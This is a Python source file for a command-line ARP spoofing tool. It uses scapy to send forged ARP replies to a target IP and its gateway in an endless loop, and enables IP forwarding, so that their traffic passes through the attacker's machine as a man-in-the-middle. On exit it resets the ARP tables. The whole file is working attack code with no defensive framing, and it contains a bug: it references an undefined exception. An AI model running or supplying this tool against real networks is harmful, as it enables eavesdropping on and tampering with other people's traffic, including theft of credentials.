from scapy.layers.l2 import ARP, Ether, srp, send
from termcolor import cprint
import argparse
import time
import os

class NoTargetSpecified(Exception):
    pass

class NoGatewaySpecified(Exception):
    pass

#Evaluate MAC address of a specific IP
def get_MAC(ip):
    arp_header = ARP(pdst=ip)
    eth_header = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = eth_header/arp_header

    response_list = srp(packet, timeout=1, verbose=False)[0]

    return response_list[0][1].hwsrc

#Use ARP response to update MAC address of spoof_ip on victim_IP ARP table 
def spoof(victim_IP, victim_MAC, spoof_IP):
    packet = ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=spoof_IP)
    send(packet, verbose=False)


#Evaluate if IP_address is valid
def check_format_IP(IP_address):
    IP_numbers = IP_address.split('.')
    
    if len(IP_numbers)!=4:
        raise NoNetworkSpecified
    else:
        for num in IP_numbers:
            if(int(num)>255 or int(num)<0):
                raise NoNetworkSpecified

    return IP_address


def reset_arp_tables(target_IP, target_MAC, gateway_IP, gateway_MAC):
    packet = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=gateway_IP, hwsrc=gateway_MAC)
    send(packet, count=4, verbose=False)
    packet = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, psrc=target_IP, hwsrc=target_MAC)
    send(packet, count=4, verbose=False)

#Parser of command line arguments
def args_parser():
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-target", "-t", dest="target", help="IP address of the victim")
    parser.add_argument("-gateway", "-g", dest="gateway", help="IP address of the gateway of the network")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.target:
            raise NoTargetSpecified
        
        if not args.gateway:
            raise NoGatewaySpecified
        
        target_IP=check_format_IP(args.target)
        cprint('\nTarget  address:   ', 'yellow', attrs=['bold',], end='')
        print(f'{target_IP}')
        gateway_IP=check_format_IP(args.gateway)
        cprint('Gateway  address:  ', 'green', attrs=['bold',], end='')
        print(f'{gateway_IP}', end='\n\n')

    except (NoTargetSpecified, NoGatewaySpecified) as e :
        parser.print_help()
        exit(0)

    return target_IP, gateway_IP



def main():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    #To establish MIDM connection, we need to repeat the update of ARP 
    #table for victim and gateway otherwise it is automatic reset
    target_IP, gateway_IP = args_parser()
    target_MAC = get_MAC(target_IP)
    gateway_MAC = get_MAC(gateway_IP)
    num_pkts = 0

    try:
        while True:
            #Send ARP response to target_IP so my PC pretends to be the gateway
            #sending my MAC as Ethernet Address of packet 
            spoof(target_IP, target_MAC, gateway_IP)
            #Send ARP response to gateway_IP so my PC pretends to be the target
            #sending my MAC as Ethernet Address of packet
            spoof(gateway_IP, gateway_MAC, target_IP)
            num_pkts += 2
            print('\rPackets sent: ', end='')
            cprint('{:>5}'.format(num_pkts), 'blue', attrs=['bold',], end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[Detected CTRL+C] Closing the program...", end='\n\n')
        reset_arp_tables(target_IP, target_MAC, gateway_IP, gateway_MAC)

if __name__=="__main__":
    main()
